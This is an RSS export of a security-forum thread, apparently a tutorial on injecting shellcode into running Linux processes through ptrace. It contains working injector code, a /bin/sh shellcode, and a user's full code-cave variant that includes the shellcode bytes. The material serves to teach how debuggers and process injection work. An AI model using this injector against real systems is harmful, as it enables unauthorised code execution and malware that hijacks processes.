<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[Linux] Infecting Running Processes</title>
    <link>https://0x00sec.org/t/linux-infecting-running-processes/1097</link>
    <description>We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processes in memory... In other words, it will introduce you to the basics of how to write your own debugger.


# Use Cases

Before going into the gory details, let&#39;s introduce a couple of situations that may benefit of being able to inject code on a running program.

The very first use case is not really malware related and has been a matter of research for many years: Run-time patching. There are systems that cannot be switched off, or, in other words, switching them off will cost a lot of money. For that reason, being able to apply patches or updates to running process (without even restarting the application) was an hot problem some years ago. Nowadays the cloud/VM paradigm have solved the problem in a different way and this &quot;SW hot-swapping&quot; is not that popular anymore.

The other main benign use case is the development of debuggers and reverse engineering tools. Look for instance to radare2... you will learn the basics of how it works in this paper.

Other use case is obviously the development of malware. Virus, backdoors, etc... I guess there are a lot of uses in here that I cannot even imagine. One use case, many of you may know is the meterpreter process migration capability. That function that moves your payload into a innocent running program.

If you had read some of my papers before, you will know that I&#39;m going to talk about Linux. The basic concepts should be very similar in other operating systems, so I hope this may be useful even if you are not a Linux user.

Enough of introduction let&#39;s get to the code

# Process Debugging in Linux
Technically speaking, the way to access another process and modify it is through the debugging interfaces provided by the operating systems. The debug system call on Linux is named `ptrace`. `Gdb`, `radare2`, `ddd`, `strace` all those tools use `ptrace` in order to be able to provide their services.

The `ptrace` system call allows a process to debug another process. Using `ptrace` we will be able to stop a target process execution and examine the values of its registers and memory as well as change them to whatever value we want.

There are two ways to start debugging a process. The first and more immediate one, is to make our `debugger` start the process... `fork` and `exec`. This is what happens when you pass a program name as a parameter to `gdb` or `strace`.

The other option we have is to dynamically attach our debugger to a running process. 

For this paper we will concentrate on the second one. Whenever you get familiar enough with the basics you will not have any problem to find the details on how to start a process yourself to debug it.

# Attaching to a running process
The first thing we have to do in order to modify a running process is to start debugging it. This process is called `attach` and actually that is the name of the `gdb` command to do what we are about to see in the code:

```
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

#include &lt;sys/ptrace.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;

#include &lt;sys/user.h&gt;
#include &lt;sys/reg.h&gt;

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf (&quot;+ Tracing process %d\n&quot;, target);
  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)
    {
      perror (&quot;ptrace(ATTACH):&quot;);
      exit (1);
    }
  printf (&quot;+ Waiting for process...\n&quot;);
  wait (NULL);

```
In the code above, you can see the typical main function expecting one parameter. In this case the parameter is the `PID` (Process IDentifier) for the process we want to modify. We will be using this parameter in each single `ptrace` call, so we better store it somewhere (`target` variable).

Then we just call `ptrace` using as first parameter `PTRACE_ATTACH`, and as second parameter the `pid` of the process we want to get attached to. After that, we have to call `wait` to _wait_ for the `SIGTRAP` signal indicating that the attaching process is completed.

At this point, the process we are connected to is stopped, and we can start modifying it at will.

# Injecting code
First we have to decide where do we want our code injected. There are quite some possibilities:

* We can just inserted at the current instruction being executed. This is very straight forward but it destroys the target process, making impossible recovering its original functionality.
* We can try to inject the code at the address where the `main` function is located. There are chances that the code there contains some initialization that only happens at the beginning of the execution, and therefore we may keep the original functionality working as expected.
* Another option is to use one of the ELF infection techniques, and inject the code, for instance, is a code cave in memory
* Finally, we can inject the code in the stack, as a normal buffer overflow. This is pretty safe to avoid destroying the program, but the process may be protected with a non-executable stack.

For the sake of simplicity, we are going to inject the code just at the position of the Instruction Pointer (`rip` register for x86 64bits) when we get control of the process. As you will see in a sec, the code we are injecting is the typical shellcode starting a shell session, and therefore we are not expecting to give control back to the original process. In other words, it does not matter if we destroy part of the program.

# Get the Registers and Smash the Memory
This is the code to inject the code in the process under control:

```
  printf (&quot;+ Getting Registers\n&quot;);
  if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)
    {
      perror (&quot;ptrace(GETREGS):&quot;);
      exit (1);
    }

  printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
  regs.rip += 2;	      
```

The first thing we find in this code is a call to `ptrace` with parameter `PTRACE_GETREGS`. This call allows our program to retrieve the values of the registers from the process under control. 

After that, we use a function to inject our shellcode in the target process. Note that we are taking the value of `regs.rip` that actually contains the current Instruction Pointer register value from the target process. The `inject_data` function, as you can imagine, just copy our shellcode into the address pointed by `reg.rip` but __in the target process__.

Let&#39;s see how.

```
int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i &lt; len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)
	{
	  perror (&quot;ptrace(POKETEXT):&quot;);
	  return -1;
	}
    }
  return 0;
}
```

Very simple isn&#39;t it?. There are only two things we have to comment about this function:

1. `PTRACE_POKETEXT` is used to write in the memory of the process being debugged. This is how we actually inject the code in the target process. There is a `PTRACE_PEEKTEXT` also.
2. The `PTRACE_POKETEXT` function works on words, so we convert everything to word pointers (32bits) and we also increase `i` by 4.

# Running the injected code
Now that the target process memory has been modified to contain the code we want to run we just need to give control back to the process and let it keep running. This can be done in a couple of different ways. In this case we will just `detach` the target process, that is, we stop debugging the target process. This action effectively stops the debug session and continues the execution of the target process:

```
  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);
  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)
    {
      perror (&quot;ptrace(GETREGS):&quot;);
      exit (1);
    }
  printf (&quot;+ Run it!\n&quot;);
 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)
	{
	  perror (&quot;ptrace(DETACH):&quot;);
	  exit (1);
	}
  return 0;
}
```

This should also be pretty straightforward to understand. You may have notice that we are setting the registers back, before `detaching`. OK. Go back to the previous section for a while and check how do we inject the code... Do you see that `regs.rip +=2` line there.

Yes, we had modified the instruction pointer, and that is the reason why we have to set the registers on the target process, before giving the control back. What happens is that, the `PTRACE_DEATCH` subtracts 2 bytes to the Instruction Pointer.

# How to figure out those 2 bytes
Those 2 bytes subtracted from `RIP` when calling `PTRACE_DEATCH` were a tricky thing to figure out. I&#39;ll tell you how I did it, in case you wonder.

During testing, the target program was crashing when I tried to inject code in the stack. One reason was that the stack was not executable for my target program. I fixed that using the `execstack` tool. But the problem also happened when injecting code in memory regions with execution permissions. So I activated the core dump and analysed what happened.

The reason is that, you cannot run `gdb` against the target program, otherwise our very first `ptrace` call will fail. Yes, you cannot debug the same program with two debuggers at the same time (this sentence hides a common anti-debugging technique :) ). So, what I&#39;ve got when trying to inject code in the stack was this.

The output of the injector was:

    + Tracing process 15333
    + Waiting for process...
    + Getting Registers
    + Injecting shell code at 0x7ffe9a708728
    + Setting instruction pointer to 0x7ffe9a708708
    + Run it!

Of course all the addresses and PIDs will be different in your system. Anyway, this produced a core dump on the target that we can open with `gdb` to check what happened.

    $ gdb ./target core
    (... gdb start up messages removed ...)
    Reading symbols from ./target...(no debugging symbols found)...done.
    [New LWP 15333]
    Core was generated by `./target&#39;.
    Program terminated with signal SIGSEGV, Segmentation fault.
    #0  0x00007ffe9a708706 in ?? ()

What you see there is the address that caused the segmentation fault. If you compare it with the address reported by the injector you can see the 2 bytes difference. Fixing that and the stack permissions made the injector work fine.

# Testing Program
In order to test this concept I wrote a very simple program. It just prints its `pid` (so I do not have to look for it), and then writes 10 times a message in the screen waiting 2 seconds between messages. This gives you time to launch the injector.

```
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int main()
{   
    int i;

    printf (&quot;PID: %d\n&quot;, (int)getpid());
    for(i = 0;i &lt; 10; ++i) {

	write (1, &quot;Hello World\n&quot;, 12);
        sleep(2);
    }
    getchar();
    return 0;
}

```

The shellcode I used was produced from this simple assembler file:

```
section .text
        global _start

_start:
        xor rax,rax
        mov rdx,rax             ; No Env
        mov rsi,rax             ; No argv
        lea rdi, [rel msg]

        add al, 0x3b

        syscall
        msg db &#39;/bin/sh&#39;,0

```

# Final Word
`ptrace` is a very powerful tool. In this paper we have just shown the very basics. Now it is a good time to fire up your terminal and type `man ptrace` to learn about the wonders of this system call.

You may try a couples of things yourself, in case you are interested:

- Modify the injector to feed the code in a code cave
- Use more sophisticated shellcodes that forks a process and keeps the original program running
- Your shellcode will be running on the target project and will have access to all open files... 

_Note: I haven&#39;t tried any of these things myself_ :) 

As usual, you can find all the code for this paper in my github account.

https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject

Hack Fun!</description>
    
    <lastBuildDate>Fri, 03 Nov 2017 22:13:41 +0000</lastBuildDate>
    <category>Programming</category>
    <atom:link href="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/10</link>
        <pubDate>Sun, 21 Jan 2018 00:30:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-10</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[REal0day]]></dc:creator>
        <description><![CDATA[
            <p>Just completed this. LOVE the tutorial. Thanks so much for this! Very interesting and learned a lot.</p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/9</link>
        <pubDate>Fri, 03 Nov 2017 22:13:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-9</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>I believe many of us have read that book. It is a great book!</p>
<p><a href="https://0x00sec.org/t/hacking-related-books/849">https://0x00sec.org/t/hacking-related-books/849</a></p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/8</link>
        <pubDate>Tue, 06 Jun 2017 05:20:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-8</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[Bowlslaw]]></dc:creator>
        <description><![CDATA[
            <p>Has anyone read <a href="https://www.amazon.com/Learning-Binary-Analysis-elfmaster-ONeill/dp/1782167102?tag=0x00sec03-20" rel="nofollow noopener">Learning Linux Binary Analysis</a>?</p>
<p>It covers a lot of what is covered here. In addition, it gives an excellent overview of the ELF format and goes over how to write Linux malware</p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/7</link>
        <pubDate>Tue, 06 Jun 2017 01:08:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-7</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Necrobumping can be bad. But in this case I think it’s fully acceptable.</p>
<p>This article is super relevant, and interesting, and I can’t believe I missed it.</p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/6</link>
        <pubDate>Sat, 03 Jun 2017 08:02:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-6</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Congrats <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> <img src="https://0x00sec.org/images/emoji/twitter/trophy.png?v=9" title=":trophy:" class="emoji" alt=":trophy:">  !.. Very neat solution!</p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/5</link>
        <pubDate>Mon, 19 Sep 2016 05:02:02 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-5</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="0x00pf" data-post="1" data-topic="1097">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>Modify the injector to feed the code in a code cave</p>
</blockquote>
</aside>
<p>Here’s my version:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/user.h&gt;
#include &lt;sys/reg.h&gt;
#include &lt;errno.h&gt;
#include &lt;elf.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;


#define SHELLCODE_SIZE 32

/* Spawn a shell */
unsigned char *shellcode =
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";

int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  /* Inject code at the start of the padding bytes */
  for (i = 0; i &lt; len; i+=4, s++, d++)
  {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)
      {
	       perror ("PTRACE_POKETEXT:");
	       return -1;
      }
  }

  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target_pid;
  struct user_regs_struct regs;
  int                     fd, i, gap;
  int                     *text_end_addr;
  int                     text_end;
  uint8_t                 *data;
  struct                  stat st;
  Elf64_Ehdr              *ehdr;
  Elf64_Phdr              *phdr;
  Elf64_Shdr              *shdr;

  if (argc != 3)
  {
      fprintf (stderr, "Usage:\t%s &lt;exectuable&gt; &lt;pid&gt;\n", argv[0]);
      exit (1);
  }

  /* Open the binary */
  if ( (fd = open(argv[1], O_RDONLY)) &lt; 0) {
      perror("open");
      exit(-1);
  }

  /* Get its size */
  if (fstat(fd, &amp;st) &lt; 0) {
      perror("fstat");
      exit(-1);
  }

  /* Map the executable in memory */
  data = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
  if(data == MAP_FAILED) {
      perror("mmap");
      exit(-1);
  }

  ehdr = (Elf64_Ehdr *)data;
  phdr = (Elf64_Phdr *)(data + ehdr-&gt;e_phoff);

  /* Check if the file is of type ELF */
  if ( data[0] != 0x7f &amp;&amp; strcmp(&amp;data[1], "ELF") ) {
      fprintf(stderr,"%s is not an ELF file.\n", argv[1]);
      exit(-1);
  }

  /* Check if the ELF file is of type ET_EXEC */
  if(ehdr-&gt;e_type != ET_EXEC) {
      fprintf(stderr, "%s is not an exectuable\n", argv[1]);
      exit(-1);
  }

  printf("[+] Entry point @ 0x%x\n", ehdr-&gt;e_entry);

  printf("\n~ Program Headers ~\n\n");

  /*
        --------------
        | ELF Header |
        --------------
        | Phdr Table |
        --------------  &lt;--- Beginning of Program Headers
        |   .text    |
        --------------
        |  (.ro)data |
        --------------
  */

  for(i = 0; i &lt; ehdr-&gt;e_phnum; i++)
  {
      if (phdr[i].p_type == PT_LOAD) {

              /* The .text segment is always at offset 0 */
              if(phdr[i].p_offset == 0) {
                  printf("[+] LOAD segment @ 0x%x\n", phdr[i].p_vaddr);
                  text_end_addr = (int *)(phdr[i].p_vaddr + phdr[i].p_filesz);
                  text_end = phdr[i].p_offset + phdr[i].p_filesz;
              }

              else {
                  /* The 2nd LOAD segment is usually the .data segment */
                  printf("[+] LOAD segment @ 0x%x\n", phdr[i].p_vaddr);
                  gap = phdr[i].p_offset - text_end;
              }
      }
  }

  printf ("[+] .text segment gap starting @ offset 0x%x\n[+] %d bytes available for shellcode\n", text_end, gap);

  target_pid = atoi (argv[2]);
  printf ("\n\n[+] Tracing process %d\n", target_pid);

  if ((ptrace (PTRACE_ATTACH, target_pid, NULL, NULL)) &lt; 0)
  {
      perror ("PTRACE_ATTACH:");
      exit (1);
  }

  printf ("[+] Waiting for process...\n");

  /* Waiting for a SIGTRAP signal */
  wait (NULL);

  /* Get the value of the registers */
  printf ("[+] Reading Registers...\n");
  if ((ptrace (PTRACE_GETREGS, target_pid, NULL, &amp;regs)) &lt; 0)
  {
    perror ("PTRACE_GETREGS:");
    exit (1);
  }

  /* Inject code into current RIP position */
  printf ("[+] Injecting shellcode @ address %p\n", text_end_addr);
  inject_data (target_pid, shellcode, (void*)text_end_addr, SHELLCODE_SIZE);

  regs.rip = (long)text_end_addr;
  regs.rip += 2;

  printf ("[+] Setting instruction pointer to %p\n", (void*)regs.rip);

  /* Set registers so that RIP points to the shellcode */
  if ((ptrace (PTRACE_SETREGS, target_pid, NULL, &amp;regs)) &lt; 0)
  {
      perror ("PTRACE_SETREGS:");
      exit (1);
  }

  if ((ptrace (PTRACE_DETACH, target_pid, NULL, NULL)) &lt; 0)
  {
	  perror ("PTRACE_DETACH:");
	  exit (1);
  }

  close(fd);
  return 0;

}
</code></pre>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/4</link>
        <pubDate>Sun, 18 Sep 2016 23:14:24 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-4</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Sorry about that <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"><br>
It’d be great to collaborate. Send me a message on the next topic. I’ll do whenever I get another idea</p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/3</link>
        <pubDate>Fri, 16 Sep 2016 22:11:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-3</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Dude! Second time where I’m about to write up a paper on a certain topic and you wrote it sooner xD Either way, great explanation as always, ptrace is really powerful. Maybe we can collaborate on a similar topic in the future since our ideas seem to be alike.</p>
          <p><a href="https://0x00sec.org/t/linux-infecting-running-processes/1097/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/linux-infecting-running-processes/1097/2</link>
        <pubDate>Fri, 16 Sep 2016 21:22:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-1097-2</guid>
        <source url="https://0x00sec.org/t/linux-infecting-running-processes/1097.rss">[Linux] Infecting Running Processes</source>
      </item>
      <item>
        <title>[Linux] Infecting Running Processes</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>We have already seen how to infect a file injecting code into the binary so it gets executed next time the infected program is started. But, how to infect a process that is already running?. Well, this paper will introduce the basic techniques you need to learn in order to fiddle with other processes in memory… In other words, it will introduce you to the basics of how to write your own debugger.</p>
<h1>Use Cases</h1>
<p>Before going into the gory details, let’s introduce a couple of situations that may benefit of being able to inject code on a running program.</p>
<p>The very first use case is not really malware related and has been a matter of research for many years: Run-time patching. There are systems that cannot be switched off, or, in other words, switching them off will cost a lot of money. For that reason, being able to apply patches or updates to running process (without even restarting the application) was an hot problem some years ago. Nowadays the cloud/VM paradigm have solved the problem in a different way and this “SW hot-swapping” is not that popular anymore.</p>
<p>The other main benign use case is the development of debuggers and reverse engineering tools. Look for instance to radare2… you will learn the basics of how it works in this paper.</p>
<p>Other use case is obviously the development of malware. Virus, backdoors, etc… I guess there are a lot of uses in here that I cannot even imagine. One use case, many of you may know is the meterpreter process migration capability. That function that moves your payload into a innocent running program.</p>
<p>If you had read some of my papers before, you will know that I’m going to talk about Linux. The basic concepts should be very similar in other operating systems, so I hope this may be useful even if you are not a Linux user.</p>
<p>Enough of introduction let’s get to the code</p>
<h1>Process Debugging in Linux</h1>
<p>Technically speaking, the way to access another process and modify it is through the debugging interfaces provided by the operating systems. The debug system call on Linux is named <code>ptrace</code>. <code>Gdb</code>, <code>radare2</code>, <code>ddd</code>, <code>strace</code> all those tools use <code>ptrace</code> in order to be able to provide their services.</p>
<p>The <code>ptrace</code> system call allows a process to debug another process. Using <code>ptrace</code> we will be able to stop a target process execution and examine the values of its registers and memory as well as change them to whatever value we want.</p>
<p>There are two ways to start debugging a process. The first and more immediate one, is to make our <code>debugger</code> start the process… <code>fork</code> and <code>exec</code>. This is what happens when you pass a program name as a parameter to <code>gdb</code> or <code>strace</code>.</p>
<p>The other option we have is to dynamically attach our debugger to a running process.</p>
<p>For this paper we will concentrate on the second one. Whenever you get familiar enough with the basics you will not have any problem to find the details on how to start a process yourself to debug it.</p>
<h1>Attaching to a running process</h1>
<p>The first thing we have to do in order to modify a running process is to start debugging it. This process is called <code>attach</code> and actually that is the name of the <code>gdb</code> command to do what we are about to see in the code:</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdint.h&gt;

#include &lt;sys/ptrace.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;unistd.h&gt;

#include &lt;sys/user.h&gt;
#include &lt;sys/reg.h&gt;

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);
  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }
  printf ("+ Waiting for process...\n");
  wait (NULL);

</code></pre>
<p>In the code above, you can see the typical main function expecting one parameter. In this case the parameter is the <code>PID</code> (Process IDentifier) for the process we want to modify. We will be using this parameter in each single <code>ptrace</code> call, so we better store it somewhere (<code>target</code> variable).</p>
<p>Then we just call <code>ptrace</code> using as first parameter <code>PTRACE_ATTACH</code>, and as second parameter the <code>pid</code> of the process we want to get attached to. After that, we have to call <code>wait</code> to <em>wait</em> for the <code>SIGTRAP</code> signal indicating that the attaching process is completed.</p>
<p>At this point, the process we are connected to is stopped, and we can start modifying it at will.</p>
<h1>Injecting code</h1>
<p>First we have to decide where do we want our code injected. There are quite some possibilities:</p>
<ul>
<li>We can just inserted at the current instruction being executed. This is very straight forward but it destroys the target process, making impossible recovering its original functionality.</li>
<li>We can try to inject the code at the address where the <code>main</code> function is located. There are chances that the code there contains some initialization that only happens at the beginning of the execution, and therefore we may keep the original functionality working as expected.</li>
<li>Another option is to use one of the ELF infection techniques, and inject the code, for instance, is a code cave in memory</li>
<li>Finally, we can inject the code in the stack, as a normal buffer overflow. This is pretty safe to avoid destroying the program, but the process may be protected with a non-executable stack.</li>
</ul>
<p>For the sake of simplicity, we are going to inject the code just at the position of the Instruction Pointer (<code>rip</code> register for x86 64bits) when we get control of the process. As you will see in a sec, the code we are injecting is the typical shellcode starting a shell session, and therefore we are not expecting to give control back to the original process. In other words, it does not matter if we destroy part of the program.</p>
<h1>Get the Registers and Smash the Memory</h1>
<p>This is the code to inject the code in the process under control:</p>
<pre><code class="lang-auto">  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
  regs.rip += 2;	      
</code></pre>
<p>The first thing we find in this code is a call to <code>ptrace</code> with parameter <code>PTRACE_GETREGS</code>. This call allows our program to retrieve the values of the registers from the process under control.</p>
<p>After that, we use a function to inject our shellcode in the target process. Note that we are taking the value of <code>regs.rip</code> that actually contains the current Instruction Pointer register value from the target process. The <code>inject_data</code> function, as you can imagine, just copy our shellcode into the address pointed by <code>reg.rip</code> but <strong>in the target process</strong>.</p>
<p>Let’s see how.</p>
<pre><code class="lang-auto">int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i &lt; len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}
</code></pre>
<p>Very simple isn’t it?. There are only two things we have to comment about this function:</p>
<ol>
<li>
<code>PTRACE_POKETEXT</code> is used to write in the memory of the process being debugged. This is how we actually inject the code in the target process. There is a <code>PTRACE_PEEKTEXT</code> also.</li>
<li>The <code>PTRACE_POKETEXT</code> function works on words, so we convert everything to word pointers (32bits) and we also increase <code>i</code> by 4.</li>
</ol>
<h1>Running the injected code</h1>
<p>Now that the target process memory has been modified to contain the code we want to run we just need to give control back to the process and let it keep running. This can be done in a couple of different ways. In this case we will just <code>detach</code> the target process, that is, we stop debugging the target process. This action effectively stops the debug session and continues the execution of the target process:</p>
<pre><code class="lang-auto">  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");
 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;
}
</code></pre>
<p>This should also be pretty straightforward to understand. You may have notice that we are setting the registers back, before <code>detaching</code>. OK. Go back to the previous section for a while and check how do we inject the code… Do you see that <code>regs.rip +=2</code> line there.</p>
<p>Yes, we had modified the instruction pointer, and that is the reason why we have to set the registers on the target process, before giving the control back. What happens is that, the <code>PTRACE_DEATCH</code> subtracts 2 bytes to the Instruction Pointer.</p>
<h1>How to figure out those 2 bytes</h1>
<p>Those 2 bytes subtracted from <code>RIP</code> when calling <code>PTRACE_DEATCH</code> were a tricky thing to figure out. I’ll tell you how I did it, in case you wonder.</p>
<p>During testing, the target program was crashing when I tried to inject code in the stack. One reason was that the stack was not executable for my target program. I fixed that using the <code>execstack</code> tool. But the problem also happened when injecting code in memory regions with execution permissions. So I activated the core dump and analysed what happened.</p>
<p>The reason is that, you cannot run <code>gdb</code> against the target program, otherwise our very first <code>ptrace</code> call will fail. Yes, you cannot debug the same program with two debuggers at the same time (this sentence hides a common anti-debugging technique <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> ). So, what I’ve got when trying to inject code in the stack was this.</p>
<p>The output of the injector was:</p>
<pre><code>+ Tracing process 15333
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7ffe9a708728
+ Setting instruction pointer to 0x7ffe9a708708
+ Run it!
</code></pre>
<p>Of course all the addresses and PIDs will be different in your system. Anyway, this produced a core dump on the target that we can open with <code>gdb</code> to check what happened.</p>
<pre><code>$ gdb ./target core
(... gdb start up messages removed ...)
Reading symbols from ./target...(no debugging symbols found)...done.
[New LWP 15333]
Core was generated by `./target'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x00007ffe9a708706 in ?? ()
</code></pre>
